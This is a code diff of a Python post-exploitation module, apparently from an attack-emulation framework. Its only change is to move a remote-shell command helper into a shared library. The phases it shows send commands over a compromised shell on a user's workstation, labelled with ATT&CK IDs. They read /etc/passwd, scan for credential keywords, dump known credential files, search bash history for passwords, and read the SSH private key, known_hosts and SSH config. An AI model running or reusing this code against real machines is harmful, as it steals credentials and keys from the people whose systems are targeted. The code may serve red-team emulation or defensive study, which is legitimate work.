@@ -2,7 +2,7 @@ import re
 import socket
 import time
 
-from chainlog import log
+from chainlog import log, run_remote
 
 # =============================================================================
 # enumeration_john_ws.py — Targeted Enumeration on John's Workstation
@@ -33,54 +33,6 @@ KNOWN_CRED_FILES = [
 
 # Common DB file extensions
 DB_EXTENSIONS = r"\.db$\|\.sqlite$\|\.sqlite3$"
-
-_sentinel_seq = 0
-
-
-# ---------------------------------------------------------------------------
-# Shell helpers
-# ---------------------------------------------------------------------------
-
-def _drain(shell):
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=15):
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.5)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev)
-
-    if sentinel in buf:
-        buf = buf[: buf.index(sentinel)]
-
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    return buf.replace("\r", "").strip()
 
 
 # ---------------------------------------------------------------------------
@@ -114,11 +66,11 @@ def _phase_system(john_shell):
     """T1082 · T1087.001 · T1016 — who, what OS, what network."""
     log("\n[*] System fingerprinting (T1082 · T1087.001 · T1016)")
 
-    identity = _run_remote(john_shell, "id")
-    hostname = _run_remote(john_shell, "hostname")
-    kernel   = _run_remote(john_shell, "uname -r")
-    users    = _run_remote(john_shell, "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1")
-    network  = _run_remote(john_shell, "ip addr show | grep 'inet '")
+    identity = run_remote(john_shell, "id")
+    hostname = run_remote(john_shell, "hostname")
+    kernel   = run_remote(john_shell, "uname -r")
+    users    = run_remote(john_shell, "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1")
+    network  = run_remote(john_shell, "ip addr show | grep 'inet '")
 
     log(f"    identity : {_clean(identity)[-1] if _clean(identity) else '?'}")
     log(f"    hostname : {_clean(hostname)[-1] if _clean(hostname) else '?'}")
@@ -138,13 +90,13 @@ def _phase_file_discovery(john_shell):
     """T1083 — overview of home directory structure."""
     log("\n[*] File and directory discovery (T1083)")
 
-    home_ls    = _run_remote(john_shell, f"ls -1 {HOME_DIR}")
-    project_ls = _run_remote(
+    home_ls    = run_remote(john_shell, f"ls -1 {HOME_DIR}")
+    project_ls = run_remote(
         john_shell,
         f"find {HOME_DIR}/projects -maxdepth 3 "
         f"-not -path '*/node_modules/*' -not -path '*/.git/*' -type f",
     )
-    docs_ls = _run_remote(john_shell, f"ls {HOME_DIR}/Documents/ 2>/dev/null")
+    docs_ls = run_remote(john_shell, f"ls {HOME_DIR}/Documents/ 2>/dev/null")
 
     home_entries    = [l for l in _clean(home_ls) if not l.strip().startswith("ls")]
     project_files   = _clean(project_ls)
@@ -170,7 +122,7 @@ def _phase_keyword_scan(john_shell):
     log("\n[*] Credential keyword scan (T1552.001)")
 
     # Use find+xargs so node_modules exclusion is reliable across grep versions
-    hits_raw = _run_remote(
+    hits_raw = run_remote(
         john_shell,
         f"find {HOME_DIR} -type f "
         f"-not -path '*/node_modules/*' -not -path '*/.git/*' -not -path '*/.npm/*' "
@@ -217,11 +169,11 @@ def _phase_credential_files(john_shell, keyword_hits):
 
     # Only read known credential files — keyword hits are informational only
     for path in KNOWN_CRED_FILES:
-        size_raw = _run_remote(john_shell, f"wc -c < {path} 2>/dev/null || echo 0")
+        size_raw = run_remote(john_shell, f"wc -c < {path} 2>/dev/null || echo 0")
         size = _clean(size_raw)
         if not size or not size[-1].strip().isdigit() or int(size[-1].strip()) == 0:
             continue
-        content = _run_remote(john_shell, f"cat {path} 2>/dev/null")
+        content = run_remote(john_shell, f"cat {path} 2>/dev/null")
         clean = _clean(content)
         if not clean:
             continue
@@ -234,7 +186,7 @@ def _phase_credential_files(john_shell, keyword_hits):
                 log(f"    → DB credential : {db_creds['user']}@{db_creds['host']}:{db_creds['port']}/{db_creds['dbname']}")
 
     # bash_history — count relevant lines only
-    hist_count = _run_remote(
+    hist_count = run_remote(
         john_shell,
         f"grep -ic 'psql\\|pgpass\\|mysql\\|password\\|secret' "
         f"{HOME_DIR}/.bash_history 2>/dev/null || echo 0",
@@ -257,14 +209,14 @@ def _phase_ssh_artifacts(john_shell):
     log("\n[*] SSH artifact discovery (T1552.004)")
 
     ssh_key = None
-    key_raw = _run_remote(john_shell, f"cat {SSH_DIR}/id_ed25519 2>/dev/null")
+    key_raw = run_remote(john_shell, f"cat {SSH_DIR}/id_ed25519 2>/dev/null")
     if "PRIVATE KEY" in key_raw:
         ssh_key = key_raw
         log("[+] Private key        : id_ed25519 found")
     else:
         log("[-] No private key at id_ed25519")
 
-    known_raw = _run_remote(john_shell, f"cat {SSH_DIR}/known_hosts 2>/dev/null")
+    known_raw = run_remote(john_shell, f"cat {SSH_DIR}/known_hosts 2>/dev/null")
     discovered_hosts = []
     for line in known_raw.splitlines():
         line = line.strip()
@@ -281,12 +233,12 @@ def _phase_ssh_artifacts(john_shell):
     if discovered_hosts:
         log(f"[+] Known hosts        : {', '.join(discovered_hosts)}")
 
-    config_hosts = _run_remote(john_shell, f"grep '^Host ' {SSH_DIR}/config 2>/dev/null")
+    config_hosts = run_remote(john_shell, f"grep '^Host ' {SSH_DIR}/config 2>/dev/null")
     hosts_list = [l.replace("Host", "").strip() for l in _clean(config_hosts)]
     if hosts_list:
         log(f"[+] SSH config hosts   : {', '.join(hosts_list)}")
 
-    ssh_config = _run_remote(john_shell, f"cat {SSH_DIR}/config 2>/dev/null")
+    ssh_config = run_remote(john_shell, f"cat {SSH_DIR}/config 2>/dev/null")
     return {"ssh_key": ssh_key, "discovered_hosts": discovered_hosts, "ssh_config": ssh_config}
 
 
@@ -298,7 +250,7 @@ def _phase_local_dbs(john_shell):
     """T1083 — locate local database files (discovery only; no data is read)."""
     log("\n[*] Local database discovery (T1083)")
 
-    db_raw = _run_remote(
+    db_raw = run_remote(
         john_shell,
         f"find {HOME_DIR} -type f -not -path '*/node_modules/*' "
         f"\\( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \\) 2>/dev/null",
